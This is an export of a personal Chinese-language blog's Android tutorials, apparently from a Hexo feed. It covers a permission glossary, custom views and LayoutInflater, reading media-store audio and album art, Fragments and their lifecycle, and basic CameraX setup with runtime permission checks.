<p>接收Wap Push android.permission.RECEIVE_WAP_PUSH，接收WAP PUSH信息 </p>
<p>录音 android.permission.RECORD_AUDIO，录制声音通过手机或耳机的麦克 </p>
<p>排序系统任务 android.permission.REORDER_TASKS，重新排序系统Z轴运行中的任务 </p>
<p>结束系统任务 android.permission.RESTART_PACKAGES，结束任务通过restartPackage(String)方法，该方式将在外来放弃 </p>
<p>发送短信 android.permission.SEND_SMS，发送短信 </p>
<p>设置Activity观察其 android.permission.SET_ACTIVITY_WATCHER，设置Activity观察器一般用于monkey测试 </p>
<p>设置闹铃提醒 com.android.alarm.permission.SET_ALARM，设置闹铃提醒 </p>
<p>设置总是退出 android.permission.SET_ALWAYS_FINISH，设置程序在后台是否总是退出 </p>
<p>设置动画缩放 android.permission.SET_ANIMATION_SCALE，设置全局动画缩放 </p>
<p>设置调试程序 android.permission.SET_DEBUG_APP，设置调试程序，一般用于开发 </p>
<p>设置屏幕方向 android.permission.SET_ORIENTATION，设置屏幕方向为横屏或标准方式显示，不用于普通应用 </p>
<p>设置应用参数 android.permission.SET_PREFERRED_APPLICATIONS，设置应用的参数，已不再工作具体查看addPackageToPreferred(String) 介绍 </p>
<p>设置进程限制 android.permission.SET_PROCESS_LIMIT，允许程序设置最大的进程数量的限制 </p>
<p>设置系统时间 android.permission.SET_TIME，设置系统时间 </p>
<p>设置系统时区 android.permission.SET_TIME_ZONE，设置系统时区 </p>
<p>设置桌面壁纸 android.permission.SET_WALLPAPER，设置桌面壁纸 </p>
<p>设置壁纸建议 android.permission.SET_WALLPAPER_HINTS，设置壁纸建议 </p>
<p>发送永久进程信号 android.permission.SIGNAL_PERSISTENT_PROCESSES，发送一个永久的进程信号 </p>
<p>状态栏控制 android.permission.STATUS_BAR，允许程序打开、关闭、禁用状态栏 </p>
<p>访问订阅内容 android.permission.SUBSCRIBED_FEEDS_READ，访问订阅信息的数据库 </p>
<p>写入订阅内容 android.permission.SUBSCRIBED_FEEDS_WRITE，写入或修改订阅内容的数据库 </p>
<p>显示系统窗口 android.permission.SYSTEM_ALERT_WINDOW，显示系统窗口 </p>
<p>更新设备状态 android.permission.UPDATE_DEVICE_STATS，更新设备状态 </p>
<p>使用证书 android.permission.USE_CREDENTIALS，允许程序请求验证从AccountManager </p>
<p>使用SIP视频 android.permission.USE_SIP，允许程序使用SIP视频服务 </p>
<p>使用振动 android.permission.VIBRATE，允许振动 </p>
<p>唤醒锁定 android.permission.WAKE_LOCK，允许程序在手机屏幕关闭后后台进程仍然运行 </p>
<p>写入GPRS接入点设置 android.permission.WRITE_APN_SETTINGS，写入网络GPRS接入点设置 </p>
<p>写入日程提醒 android.permission.WRITE_CALENDAR，写入日程，但不可读取 </p>
<p>写入联系人 android.permission.WRITE_CONTACTS，写入联系人，但不可读取 </p>
<p>写入外部存储 android.permission.WRITE_EXTERNAL_STORAGE，允许程序写入外部存储，如SD卡上写文件 </p>
<p>写入Google地图数据 android.permission.WRITE_GSERVICES，允许程序写入Google Map服务数据 </p>
<p>写入收藏夹和历史记录 com.android.browser.permission.WRITE_HISTORY_BOOKMARKS，写入浏览器历史记录或收藏夹，但不可读取 </p>
<p>读写系统敏感设置 android.permission.WRITE_SECURE_SETTINGS，允许程序读写系统安全敏感的设置项 </p>
<p>读写系统设置 android.permission.WRITE_SETTINGS，允许读写系统设置项 </p>
<p>编写短信 android.permission.WRITE_SMS，允许编写短信 </p>
<p>写入在线同步设置 android.permission.WRITE_SYNC_SETTINGS，写入Google在线同步设置</p>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android自定义控件</title>
    <url>/posts/c99ee595/</url>
    <content><![CDATA[<h2 id="布局和控件的继承关系"><a href="#布局和控件的继承关系" class="headerlink" title="布局和控件的继承关系"></a>布局和控件的继承关系</h2><p><img src="https://image.zfxt.top/hexo-blog/Android%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8E%A7%E4%BB%B6-2023-07-22-07-22.png"></p>
<h3 id="引入布局"><a href="#引入布局" class="headerlink" title="引入布局"></a>引入布局</h3><p>我们可以自定义一个布局，然后把这个布局当作一个控件通过<code>&lt;include layout=&quot;布局文件&quot;&gt;</code>标签实现引入。<br>比如自己设计的标签栏<br><img src="https://image.zfxt.top/hexo-blog/Android%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8E%A7%E4%BB%B6-2023-07-10-05-41.png"><br>设计为一个布局文件，然后把这个布局文件当作一个控件，然后去引入他。但是，这样子的控件没有统一设定的逻辑，只有样式，没有逻辑程序设计，如果每个调用该布局的都重写一遍逻辑结构，就会有很多的冗杂代码。<br>因此</p>
<h3 id="创建自定义控件"><a href="#创建自定义控件" class="headerlink" title="创建自定义控件"></a>创建自定义控件</h3><p>实现控件的逻辑自洽。不用再去花更多的代码去重复操作。</p>
<p>新建TitleLayout继承自LinearLayout，让它成为我们自定义的标题栏控件，代码如下所示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TitleLayout</span>(context: Context, attrs: AttributeSet) : LinearLayout(context, attrs) &#123;</span><br><span class="line"> init &#123;</span><br><span class="line"> LayoutInflater.from(context).inflate(R.layout.title, <span class="built_in">this</span>)</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们在TitleLayout的主构造函数中声明了Context和AttributeSet这两个参数，在布局中<br>引入TitleLayout控件时就会调用这个构造函数。然后在init结构体中需要对标题栏布局进行动<br>态加载，这就要借助LayoutInflater来实现了。通过LayoutInflater的from()方法可以构建出<br>一个LayoutInflater对象，然后调用inflate()方法就可以动态加载一个布局文件。<br>inflate()方法接收两个参数：第一个参数是要加载的布局文件的id，这里我们传入<br>R.layout.title；第二个参数是给加载好的布局再添加一个父布局，这里我们想要指定为<br>TitleLayout，于是直接传入this。</p>
<p>然后使用这个自定义控件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag"> <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag"> <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span> &gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">com.example.uicustomviews.TitleLayout</span></span></span><br><span class="line"><span class="tag">	 <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">	 <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>他通过导入包名来使用这个自定义控件。<br>这个自定义控件本质就是一个View的子类，布局文件也是一个View的子类。这里就是将布局文件，添加到自定义控件中。然后用函数去绑定逻辑方法。</p>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android自定义控件（详解）</title>
    <url>/posts/4713194f/</url>
    <content><![CDATA[<p><img src="https://image.zfxt.top/hexo-blog/Android%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8E%A7%E4%BB%B6%EF%BC%88%E8%AF%A6%E8%A7%A3%EF%BC%89-2023-07-04-18-54.png"><br>在本质上，所有的控件和布局都是View类的子类。也就是说明，在理论上，你可以自己手搓一个控件，也就是自定义控件。而且定义自己的方法和图形，界面等。而这都是可行的。</p>
<h2 id="三种自定义控件"><a href="#三种自定义控件" class="headerlink" title="三种自定义控件"></a>三种自定义控件</h2><h3 id="自绘控件"><a href="#自绘控件" class="headerlink" title="自绘控件"></a>自绘控件</h3><p>自绘控件的意思就是，这个View上所展现的内容全部都是我们自己绘制出来的。这是一个完完全全由自己设计的控件</p>
<h3 id="组合控件"><a href="#组合控件" class="headerlink" title="组合控件"></a>组合控件</h3><p>组合控件的意思就是，我们并不需要自己去绘制视图上显示的内容，而只是用系统原生的控件就好了，但我们可以将几个系统原生的控件组合到一起，这样创建出的控件就被称为组合控件。</p>
<h3 id="继承控件"><a href="#继承控件" class="headerlink" title="继承控件"></a>继承控件</h3><p>继承控件的意思就是，我们并不需要自己重头去实现一个控件，只需要去继承一个现有的控件，然后在这个控件上增加一些新的功能，就可以形成一个自定义的控件了。这种自定义控件的特点就是不仅能够按照我们的需求加入相应的功能，还可以保留原生控件的所有功能，比如 Android PowerImageView实现，可以播放动画的强大ImageView 这篇文章中介绍的PowerImageView就是一个典型的继承控件。</p>
<h2 id="布局文件转化成view类（三种方式）"><a href="#布局文件转化成view类（三种方式）" class="headerlink" title="布局文件转化成view类（三种方式）"></a>布局文件转化成view类（三种方式）</h2><p>1.&#x2F;&#x2F;context:上下文, resource:要转换成view对象的layout的id, root:一般传null</p>
<pre><code>            view = View.inflate(context, R.layout.frist_layout, null);//将一个布局文件转换成一个view对象
</code></pre>
<p>2.&#x2F;&#x2F;通过LayoutInflater将布局转换成view对象</p>
<pre><code>          view =  LayoutInflater.from(context).inflate(R.layout.frist_layout, null);
</code></pre>
<p>3.通过context获取系统服务得到一个LayoutInflater，通过LayoutInflater将一个布局转换为view对象</p>
<pre><code>         LayoutInflater layoutInflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);

         view = layoutInflater.inflate(R.layout.frist_layout, null);
</code></pre>
<p>从布局文件转化而成的view类，你就可以通过调用他们的控件然后改变其内部方法，属性和逻辑规则来实现对控件的自定义。</p>
<h2 id="详解LayoutInflater-from-context-inflate"><a href="#详解LayoutInflater-from-context-inflate" class="headerlink" title="详解LayoutInflater.from(context).inflate()"></a>详解LayoutInflater.from(context).inflate()</h2><p>LayoutInflater.from(context).inflate()</p>
<p>首先<code>LayoutInflater.from(context)</code>他表示会从上下文中获取一个<code>LayoutInflater</code>的实例对象，这个<code>context</code>就是调用该控件的父类。<br>然后通过这个实例对象调用<code>inflate()</code>方法把布局文件载入为view类。<br>这个方法有几个重载方法，其中主要使用的参数简单的解释一下。</p>
<p>1  int resource  代表需要加载资源的id</p>
<p>2 ViewGroup root 代表资源需要被添加的地方</p>
<p>3 boolean attachToRoot 是否要被添加到root中</p>
<p>4 XmlPullParser parser 代表xml文件。</p>
<p>他主要有两种方式<br>第一种是传入资源布局id，第二种是传入xml文件。分别如图所示<br>1</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> View <span class="title function_">inflate</span><span class="params">(<span class="meta">@LayoutRes</span> <span class="type">int</span> resource, <span class="meta">@Nullable</span> ViewGroup root)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> inflate(resource, root, root != <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> View <span class="title function_">inflate</span><span class="params">(XmlPullParser parser, <span class="meta">@Nullable</span> ViewGroup root)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> inflate(parser, root, root != <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实际上这两种方式调用的都是带有attachToRoot的三个参数的重载方法。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> View <span class="title function_">inflate</span><span class="params">(<span class="meta">@LayoutRes</span> <span class="type">int</span> resource, <span class="meta">@Nullable</span> ViewGroup root, <span class="type">boolean</span> attachToRoot)</span> &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">Resources</span> <span class="variable">res</span> <span class="operator">=</span> getContext().getResources();</span><br><span class="line">                <span class="keyword">if</span> (DEBUG) &#123;</span><br><span class="line">                    Log.d(</span><br><span class="line">                        TAG, <span class="string">&quot;INFLATING from resource: \&quot;&quot;</span> + res.getResourceName(resource) + <span class="string">&quot;\&quot; (&quot;</span></span><br><span class="line">                                + Integer.toHexString(resource) + <span class="string">&quot;)&quot;</span></span><br><span class="line">                    );</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">XmlResourceParser</span> <span class="variable">parser</span> <span class="operator">=</span> res.getLayout(resource);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> inflate(parser, root, attachToRoot);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    parser.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>第三个参数指定成false，表示只让我们在父布局中声明的layout属性生效，但不会为这个<br>View添加父布局。因为一旦View有了父布局之后，它就不能再添加到ListView中了</p>
</blockquote>
<h2 id="视图绑定"><a href="#视图绑定" class="headerlink" title="视图绑定"></a>视图绑定</h2><p>有时候为了方便使用，会使用视图绑定<br>首先在app的gradle目录下，配置</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">viewBinding&#123;</span><br><span class="line">	enabled=<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后在activity中绑定视图</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">val</span> <span class="variable">binding</span> <span class="operator">=</span> ActivityMainBinding.inflate(layoutInflater)</span><br><span class="line">        setContentView(binding.root)</span><br></pre></td></tr></table></figure>
<p>在自定义控件中绑定视图</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">val</span> <span class="variable">binding</span> <span class="operator">=</span> TitleBinding.inflate(LayoutInflater.from(context), <span class="built_in">this</span>, <span class="literal">true</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android音乐专辑图片获取</title>
    <url>/posts/1b5902f7/</url>
    <content><![CDATA[<h1 id="获取android音乐部分可用信息"><a href="#获取android音乐部分可用信息" class="headerlink" title="获取android音乐部分可用信息"></a>获取android音乐部分可用信息</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">val cursor = appContext.contentResolver.query(</span><br><span class="line">            MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, arrayOf(</span><br><span class="line">                MediaStore.Audio.Media._ID,</span><br><span class="line">                MediaStore.Audio.Media.TITLE,</span><br><span class="line">                MediaStore.Audio.Media.DATA,</span><br><span class="line">                MediaStore.Audio.Media.ALBUM_ID,</span><br><span class="line">                MediaStore.Audio.Media.DURATION</span><br><span class="line">            ), MediaStore.Audio.Media.DURATION+ &quot;&gt;&#x27;1000&#x27;&quot;, null, null</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        if (cursor != null) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                while (cursor.moveToNext()) &#123;</span><br><span class="line">                    val song = Song(</span><br><span class="line">                        cursor.getLong(0),</span><br><span class="line">                        cursor.getString(1),</span><br><span class="line">                        cursor.getString(2),</span><br><span class="line">                        cursor.getLong(3),</span><br><span class="line">                        cursor.getLong(4),</span><br><span class="line">                    )</span><br><span class="line">                    _musicList.add(song)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; finally &#123;</span><br><span class="line">                cursor.close()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="在已有Album的基础上获取音乐专辑图片信息"><a href="#在已有Album的基础上获取音乐专辑图片信息" class="headerlink" title="在已有Album的基础上获取音乐专辑图片信息"></a>在已有Album的基础上获取音乐专辑图片信息</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">getAlbumArt</span><span class="params">(albumId: <span class="type">Long</span>)</span></span>: Bitmap &#123;</span><br><span class="line">        <span class="keyword">val</span> albumArtUri = ContentUris.withAppendedId(MEDIA_ALBUMART_URI,albumId)</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">val</span> inputstream = appContext.contentResolver.openInputStream(albumArtUri)</span><br><span class="line">            <span class="keyword">return</span> BitmapFactory.decodeStream(inputstream)</span><br><span class="line">        &#125;<span class="keyword">catch</span> (e: Exception)&#123;</span><br><span class="line">            e.printStackTrace()</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> music_default_art</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>Android Media</tag>
      </tags>
  </entry>
  <entry>
    <title>Android（Fragment）</title>
    <url>/posts/9a0619a3/</url>
    <content><![CDATA[<h2 id="Fragment是什么"><a href="#Fragment是什么" class="headerlink" title="Fragment是什么"></a>Fragment是什么</h2><p>Fragment是一种可以嵌入在Activity当中的UI片段。你可以将Fragment理解成一个迷你型的Activity，虽然这个迷你型的Activity有可能和普通的Activity是一样大的。<br>解决某些问题：一个页面只能展示一个activity，如果要展示另一个的话，需要入栈和出栈。但是一个activity中可以包含很多个fragment。实现了多页面共存。</p>
<h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><ol>
<li><p>首先为我们的<code>fragment</code>创建两个布局文件<br>如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">              <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span></span></span><br><span class="line"><span class="tag">              <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">              <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">&quot;@+id/button&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_gravity</span>=<span class="string">&quot;center_horizontal&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:text</span>=<span class="string">&quot;Button&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>定义一个fragment类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RightFragment</span>():Fragment()&#123;</span><br><span class="line"></span><br><span class="line">    override fun <span class="title function_">onCreateView</span><span class="params">(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?)</span>: View? &#123;</span><br><span class="line">        <span class="keyword">return</span> inflater.inflate(R.layout.right_fragment,container,<span class="literal">false</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>并重写他的onCreateView方法</p>
<blockquote>
<p>与actiivity类似，也很像自定义控件的创建方式。</p>
</blockquote>
</li>
<li><p>然后在布局中引入fragment</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">fragment</span></span></span><br><span class="line"><span class="tag">           <span class="attr">android:id</span>=<span class="string">&quot;@+id/leftFrag&quot;</span></span></span><br><span class="line"><span class="tag">           <span class="attr">android:name</span>=<span class="string">&quot;top.zfxt.fragmenttest.LeftFragment&quot;</span></span></span><br><span class="line"><span class="tag">           <span class="attr">android:layout_width</span>=<span class="string">&quot;0dp&quot;</span></span></span><br><span class="line"><span class="tag">           <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">           <span class="attr">android:layout_weight</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>需要注意，他这里使用<code>name</code>属性来引入对应的fragment<br>而在自定义控件中，直接写完整的包名来引入。</p>
</li>
<li><p>完成简单使用</p>
</li>
</ol>
<h2 id="动态引入fragment"><a href="#动态引入fragment" class="headerlink" title="动态引入fragment"></a>动态引入fragment</h2><p>修改activity中的方法，代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">override fun <span class="title function_">onCreate</span><span class="params">(savedInstanceState: Bundle?)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState)</span><br><span class="line">        <span class="type">val</span> <span class="variable">binding</span> <span class="operator">=</span> ActivityMainBinding.inflate(layoutInflater)</span><br><span class="line">        setContentView(binding.root)</span><br><span class="line">        <span class="type">val</span> <span class="variable">button</span> <span class="operator">=</span> findViewById&lt;Button&gt;(R.id.button)</span><br><span class="line">        button.setOnClickListener &#123;</span><br><span class="line">            replaceFragment(AnotherRightFragment())</span><br><span class="line">        &#125;</span><br><span class="line">        replaceFragment(RightFragment())</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> fun <span class="title function_">replaceFragment</span><span class="params">(fragment: Fragment)</span>&#123;</span><br><span class="line">        <span class="type">val</span> <span class="variable">fragmentManager</span> <span class="operator">=</span> supportFragmentManager</span><br><span class="line">        <span class="type">val</span> <span class="variable">transaction</span> <span class="operator">=</span> fragmentManager.beginTransaction()</span><br><span class="line">        transaction.replace(R.id.rightLayout,fragment)</span><br><span class="line">        transaction.commit()</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>其大致为：<br>(1) 创建待添加Fragment的实例。<br>(2) 获取FragmentManager，在Activity中可以直接调用getSupportFragmentManager()<br>方法获取。<br>(3) 开启一个事务，通过调用beginTransaction()方法开启。<br>(4) 向容器内添加或替换Fragment，一般使用replace()方法实现，需要传入容器的id和待添<br>加的Fragment实例。<br>(5) 提交事务，调用commit()方法来完成。</p>
<h2 id="fragment添加到返回栈"><a href="#fragment添加到返回栈" class="headerlink" title="fragment添加到返回栈"></a>fragment添加到返回栈</h2><p>只需要在事务执行时，添加一行<br><code>transaction.addToBackStack(null)</code><br>一般默认为null，这样子，fragment也在返回栈中，点击back后，会退回一个返回栈内容。</p>
<h2 id="fragment和activity交互"><a href="#fragment和activity交互" class="headerlink" title="fragment和activity交互"></a>fragment和activity交互</h2><p>activity获取fragment的实例：<br>Fragment提供了一个<code>supportFragmentManager</code>，activity通过这个管理器，然后调用findViewById，可以获取到Fragment的具体view然后操作。<br>fragment获取activity实例：<br>它内置了一个getActivity()方法，可以获取。<br>fragment和fragment交互：通过activity中转</p>
<h2 id="Fragment声明周期"><a href="#Fragment声明周期" class="headerlink" title="Fragment声明周期"></a>Fragment声明周期</h2><p><img src="https://image.zfxt.top/hexo-blog/Android%EF%BC%88Fragment%EF%BC%89-2023-07-21-24-50.png"></p>
<p>他的声明周期与activity很像。当activity处于暂停时，与之关联的fragment也会暂停。fragment除了有和activity几乎一样的回调方法外，还有一些附加的回调方法</p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="left">onAttach()</td>
<td align="left">当Fragment和Activity建立关联时调用。</td>
</tr>
<tr>
<td align="left">onCreateView()</td>
<td align="left">为Fragment创建视图（加载布局）时调用。</td>
</tr>
<tr>
<td align="left">onActivityCreated()</td>
<td align="left">确保与Fragment相关联的Activity已经创建完毕时调用。</td>
</tr>
<tr>
<td align="left">onDestroyView()</td>
<td align="left">当与Fragment关联的视图被移除时调用。</td>
</tr>
<tr>
<td align="left">onDetach()</td>
<td align="left">当Fragment和Activity解除关联时调用。</td>
</tr>
</tbody></table>
<h2 id="动态加载布局"><a href="#动态加载布局" class="headerlink" title="动态加载布局"></a>动态加载布局</h2><p>让系统根据屏幕尺寸自动适配使用什么布局，主要是下面这张表<br><img src="https://image.zfxt.top/hexo-blog/Android%EF%BC%88Fragment%EF%BC%89-2023-07-12-53-32.png"><br>然后通过在res下建立对应的目录：如<code>layout-small</code>,<code>drawable-xxhdpi</code>之类的。<br>如果需要设置更具体的大小限制。可以使用最小宽度限定符(smallest-widthqualifier)<br>使用过程例如：需要设置一个大于600dp而单独使用都布局，就建立一个<code>layout-sw600dp</code>的目录。就是这么简单</p>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>CameraX的基础使用</title>
    <url>/posts/da221fd9/</url>
    <content><![CDATA[<h1 id="CameraX"><a href="#CameraX" class="headerlink" title="CameraX"></a>CameraX</h1><p>他的特点是可以不用去申请相机等应用，而是可以直接调用硬件的相机源。当然采用这个或者调用相机都是没有问题的，这取决于你的需求</p>
<p>(如果你希望你的应用程序完全访问设备的相机，并且不用离开应用程序时，例如抖音，学习通)那么使用<code>CameraX</code>是个很好的决定。</p>
<blockquote>
<p>导入包</p>
</blockquote>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Camera</span></span><br><span class="line">    <span class="keyword">val</span> cameraxVersion  = <span class="string">&quot;1.3.0-rc01&quot;</span></span><br><span class="line">    implementation(<span class="string">&quot;androidx.camera:camera-core:<span class="variable">$cameraxVersion</span>&quot;</span>)</span><br><span class="line">    implementation(<span class="string">&quot;androidx.camera:camera-camera2:<span class="variable">$cameraxVersion</span>&quot;</span>)</span><br><span class="line">    implementation(<span class="string">&quot;androidx.camera:camera-lifecycle:<span class="variable">$cameraxVersion</span>&quot;</span>)</span><br><span class="line">    implementation(<span class="string">&quot;androidx.camera:camera-video:<span class="variable">$cameraxVersion</span>&quot;</span>)</span><br><span class="line">    implementation(<span class="string">&quot;androidx.camera:camera-view:<span class="variable">$cameraxVersion</span>&quot;</span>)</span><br><span class="line">    implementation(<span class="string">&quot;androidx.camera:camera-extensions:<span class="variable">$cameraxVersion</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<ol>
<li>申请权限</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">//这将会声明一个权限请求，它可以被用户看到</span><br><span class="line"><span class="tag">&lt;<span class="name">uses-feature</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;android.hardware.camera&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:required</span>=<span class="string">&quot;false&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.CAMERA&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.RECORD_AUDIO&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>申请权限和验证权限的代码：</li>
</ol>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检测是否获取到了权限，如果没有获取则申请</span></span><br><span class="line"><span class="keyword">if</span> (!hasRequiredPermissions()) &#123;</span><br><span class="line">            ActivityCompat.requestPermissions(</span><br><span class="line">                <span class="keyword">this</span>, CAMERAX_PERMISSIONS, <span class="number">0</span></span><br><span class="line">            )</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">fun</span> <span class="title">hasRequiredPermissions</span><span class="params">()</span></span>: <span class="built_in">Boolean</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> CAMERAX_PERMISSIONS.all &#123;</span><br><span class="line">            ContextCompat.checkSelfPermission(</span><br><span class="line">                applicationContext,</span><br><span class="line">                it</span><br><span class="line">            ) == PackageManager.PERMISSION_GRANTED</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//提前将所需要的权限都放在一个目录中</span></span><br><span class="line"><span class="keyword">companion</span> <span class="keyword">object</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">val</span> CAMERAX_PERMISSIONS = arrayOf(</span><br><span class="line">            Manifest.permission.CAMERA,</span><br><span class="line">            Manifest.permission.RECORD_AUDIO</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>对于使用CameraX，他当前并不能直接通过开箱即用的compose来使用。而是需要使用到view的方式来实现。</li>
</ol>
<blockquote>
<p>        通过PreviewView来实现拍摄界面关键需要接受一个摄像头控制器：它<strong>提供对部分&#x2F;所有设备摄像头的访问，允许将摄像头的生命周期 (打开&#x2F;关闭时)附加到 lifecycleOwner ，并具有应用程序进程的范围 (它是一个单例)。 就如何使用它而言，它是CameraX中的一种低级应用编程接口</strong></p>
<p>        在某种意义上说，当你使用它时，你需要初始化它，创建和配置你的用例 (即 Preview ， ImageAnalysis ， ImageCapture)，将它们绑定到 LifecycleOwner</p>
</blockquote>
